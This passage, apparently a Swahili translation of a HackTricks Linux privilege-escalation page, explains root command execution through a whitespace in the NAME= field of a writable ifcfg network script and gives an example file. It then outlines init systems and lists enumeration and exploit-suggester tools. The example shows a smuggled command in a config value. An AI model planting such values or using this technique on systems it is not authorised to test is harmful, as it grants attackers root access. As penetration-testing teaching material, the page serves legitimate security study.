**Kumbukumbu ya kosa:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ikiwa, kwa sababu yoyote, mtumiaji anaweza **kuandika** hati ya `ifcf-<chochote>` kwenye _/etc/sysconfig/network-scripts_ **au** anaweza **kurekebisha** moja iliyopo, basi **mfumo wako umeshambuliwa**.

Hati za mtandao, kama vile _ifcg-eth0_, hutumiwa kwa ajili ya uunganisho wa mtandao. Zinaonekana kama faili za .INI. Walakini, zinasakinishwa kwenye Linux na Meneja wa Mtandao (dispatcher.d).

Katika kesi yangu, `NAME=` inayotolewa katika hati hizi za mtandao haishughulikiwi kwa usahihi. Ikiwa una **nafasi nyeupe/kosongeza katika jina, mfumo unajaribu kutekeleza sehemu baada ya nafasi nyeupe/kosongeza**. Hii inamaanisha kwamba **kila kitu baada ya nafasi nyeupe ya kwanza kinatekelezwa kama root**.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd, na rc.d**

Mfumo wa `/etc/init.d` ni nyumbani kwa **script** za System V init (SysVinit), **mfumo wa usimamizi wa huduma wa Linux wa kisasa**. Inajumuisha script za `start`, `stop`, `restart`, na mara nyingine `reload` za huduma. Hizi zinaweza kutekelezwa moja kwa moja au kupitia viungo vya ishara vilivyopatikana katika `/etc/rc?.d/`. Njia mbadala katika mifumo ya Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya wa **usimamizi wa huduma** ulioanzishwa na Ubuntu, ukitumia faili za usanidi kwa kazi za usimamizi wa huduma. Ingawa kuna mpito kwa Upstart, script za SysVinit bado zinatumika pamoja na Upstart kutokana na safu ya utangamano katika Upstart.

**systemd** inatokea kama mfumo wa kisasa wa kuanzisha na kusimamia huduma, ikitoa huduma za juu kama kuanza kwa daemone kwa mahitaji, usimamizi wa automount, na picha za hali ya mfumo. Inapanga faili katika `/usr/lib/systemd/` kwa pakiti za usambazaji na `/etc/systemd/system/` kwa marekebisho ya msimamizi, ikifanya mchakato wa usimamizi wa mfumo kuwa rahisi.

## Mbinu Nyingine

### Privilege escalation ya NFS

{% content-ref url="nfs-no\_root\_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Kutoroka kutoka kwa Shells zilizozuiwa

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Ulinzi wa Usalama wa Kernel

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada Zaidi

[Binari za impacket za Statis](https://github.com/ropnop/impacket\_static\_binaries)

## Zana za Privesc za Linux/Unix

### **Zana bora ya kutafuta njia za kuongeza mamlaka ya ndani ya Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(chaguo -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Pima udhaifu wa kernel kwenye Linux na MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (upatikanaji wa kimwili):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Mkusanyiko wa hati zaidi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Marejeo

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkus
